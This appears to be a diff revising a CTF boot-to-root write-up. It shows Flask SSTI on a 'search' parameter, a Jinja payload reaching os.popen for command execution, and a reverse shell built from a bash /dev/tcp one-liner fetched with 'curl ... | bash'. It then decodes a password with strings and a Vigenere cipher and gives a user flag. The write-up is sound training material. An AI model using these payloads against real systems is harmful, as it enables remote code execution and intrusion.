@@ -5,11 +5,15 @@
 Yo !
 before starting this writeup, we would like to thank Thehackernewsbdarija community and thank the staff that created this box.
 
-![image](https://c.tenor.com/G0PWi59OVk0AAAAM/mr-bean-delicious.gif)
+<p align="center">
+  <img src="https://c.tenor.com/G0PWi59OVk0AAAAM/mr-bean-delicious.gif"/>
+</p>
 
 And i'm happy because i won this competition
 
-![happy](https://c.tenor.com/aSW9ZfIIC64AAAAC/shaq-shimmy.gif)
+<p align="center">
+  <img src="https://c.tenor.com/aSW9ZfIIC64AAAAC/shaq-shimmy.gif"/>
+</p>
 
 Description [Moroccan Darija] : https://www.facebook.com/Th3HackerNewsBdarija/posts/219555037030078
 
@@ -18,6 +22,8 @@ Download link : https://drive.google.com/file/d/1ipYcoAsZ-uTrSpFcu4s0oo0OmBKqHwg
 Enjoy!
 
 ## Writeup
+
+`PS: There was a bug in the executable but the administrator fixed it in the box version 2.0`
 
 ### Web 
 
@@ -30,9 +36,9 @@ netdiscover -r 192.168.1.1/24
 Let's scan this machine with nmap 
 
 ```Bash
-nmap -sV -sC -p- 192.168.1.109 
+nmap -sV -sC -p- 192.168.1.163
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-18 20:29 UTC
-Nmap scan report for 192.168.1.109
+Nmap scan report for 192.168.1.163
 Host is up (0.00040s latency).
 Not shown: 65533 closed ports
 PORT   STATE SERVICE VERSION
@@ -49,60 +55,171 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 23.24 seconds
 ```
+As we can see we have an OpenSSH 7.6p1 running on port 22 and a web application running on port 80 with the web server Apache httpd 2.4.29 and we already know that the OS is Ubuntu 
 
+Let's open the web page `http://192.168.1.163:80/`
 
-I started by fuzzing on parameters to detect any parametes
+![img](https://i.imgur.com/fkxEYGf.png)
+
+Source Code 
+
+```HTML
+<html>
+	<head></head>
+	<title></title>
+
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
+
+* {
+    padding: 0;
+    margin: 0;
+    box-sizing: border-box;
+    font-family: 'Press Start 2P';
+    color: #FFFFFF;
+    text-align: center;
+}
+
+body {
+    background-color: #000000;
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='42' height='58' viewBox='0 0 42 58'%3E%3Cg fill='%23dddcdd' fill-opacity='0.23'%3E%3Cpath fill-rule='evenodd' d='M12 18h12v18h6v4H18V22h-6v-4zm-6-2v-4H0V0h36v6h6v36h-6v4h6v12H6v-6H0V16h6zM34 2H2v8h24v24h8V2zM6 8a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm8 0a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm8 0a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm8 0a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm0 8a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm0 8a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm0 8a2 2 0 1 0 0-4 2 2 0 0 0 0 4zM2 50h32v-8H10V18H2v32zm28-6a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm-8 0a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm-8 0a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm-8 0a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm0-8a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm0-8a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm0-8a2 2 0 1 0 0 4 2 2 0 0 0 0-4z'/%3E%3C/g%3E%3C/svg%3E");
+}
+
+section.notFound {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin: 0 5%;
+    height: 100vh;
+}
+
+section.notFound h1 {
+    color: red;
+    font-size: 100px;
+}
+
+section.notFound h2 {
+    font-size: 50px;
+}
+
+section.notFound h1, h2, h3 {
+    margin-bottom: 40px;
+}
+
+div.text {
+    height: 50vh;
+}
+
+div.text a {
+    text-decoration: none;
+    margin-right: 20px;
+}
+
+div.text a:hover {
+    color: red;
+    text-decoration: underline;
+}
+
+@media only screen and (max-width: 768px) {
+    section.notFound {
+        flex-direction: column;
+        justify-content: space-around;
+    }
+    section.notFound div.img img {
+        width: 70vw;
+        height: auto;
+    }
+    section.notFound h1 {
+        font-size: 50px;
+    }
+    section.notFound h2 {
+        font-size: 25px;
+    }
+    div.text a:active {
+    color: red;
+    text-decoration: underline;
+  }
+}</style>
+	<body>
+    <section class="notFound">
+        <div class="img">
+		<h2>TH3 HACKER NEWS B'DARIJA</h2>
+		<img src="https://cdn.dribbble.com/users/2686403/screenshots/6472886/image.gif" />
+
+<embed src="../trap.mp3" loop="true" autostart="true" width="2"
+         height="0">
+
+	</div>
+	
+    </section>
+</body>
+</html>
+```
+
+There's nothing interested to keep digging, i used `Gobuster` to find subdirectories but i only have found `http://192.168.1.163/server-status` 
+
+I tried to fuzz on parameters to detect any parametes
 
 ![bigdd](https://imgur.com/aB2aOjP.png)
 
-After getting the "search" parameter we can remark that it is infected by a "Flask SSTI2" vulnerability 
+After getting the `search` parameter we can remark that it is infected by a `Flask SSTI2` vulnerability 
 
-`http://192.168.1.108/?search={{3 * 3}}`
+`http://192.168.1.163/?search={{3 * 3}}`
 
-![pp](https://imgur.com/xFVJDr0.png)
+![pp](https://i.imgur.com/bv4O3OD.png)
 
 We can exploit that to get an rce
 
-`http://192.168.1.108/?search={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
+`http://192.168.1.163/?search={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
 
-![bigppp](https://imgur.com/yqqngBi.png)
+![bigppp](https://i.imgur.com/yAlE8Vt.png)
 
 Getting a reverse shell
     localhost :
 
 ```bash
-echo "/bin/bash -l > /dev/tcp/192.168.1.109/4444 0<&1 2>&1" > payload.sh
+echo "/bin/bash -l > /dev/tcp/192.168.1.163/4444 0<&1 2>&1" > payload.sh
 python -m SimpleHTTPServer
 nc -nlvp 4444
 ```
 
-    Server : http://192.168.1.108/?search={{request.application.__globals__.__builtins__.__import__('os').popen('curl http://192.168.1.109:8000/payload.sh | bash').read()}}
+    Server : http://192.168.1.163/?search={{request.application.__globals__.__builtins__.__import__('os').popen('curl http://192.168.1.109:8000/payload.sh | bash').read()}}
 
 and we got a shell : 
 
-![ppd](https://i.imgur.com/QWpoHLI.png)
+```Bash
+┌[Sc4r3Cr0w]─[23:05-18/12]─[/home/unclej4ck]
+└╼unclej4ck$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [192.168.1.163] from (UNKNOWN) [192.168.1.162] 48990
+/bin/sh: 0: can't access tty; job control turned off
+````
 
 ### Pwn 
 
-After getting a shell as c3p0 we can see an executable "hackernews"
+After getting a shell as data we can see an executable `hackernews`, this executable asks for a password 
 
-![bigpp](https://i.imgur.com/gULwJX9.png)
-
-This executable asks for a password 
-
-![ON0WT2w.png](https://i.imgur.com/ON0WT2w.png)
-
+```Bash
+www-data@thehackernewsbdarija:/home/c3p0$ ./hackernews
+What is the password?
+````
 We can simply find the password by using strings 
 
-![pwn](https://imgur.com/GF8XlNx.png)
+![pwn](https://i.imgur.com/zQQk7CC.png)
 
 By submitting the file we get an encoded password 
 
-![pp](https://i.imgur.com/4P3761I.png)
+![pp](https://i.imgur.com/NgVg2i5.png)
 
 The encoded password is encoded with Vigenere cipher with decode.fr
 
 ![hh](https://imgur.com/8IWQ4BL.png)
+
+Let's ssh into `c3p0` account now 
+
+`ssh c3p0@192.168.1.163`
+
+We found the first flag
 
 `user.txt : thnb{m4b9a_w4l0_4lm0jt4h1D}`
 
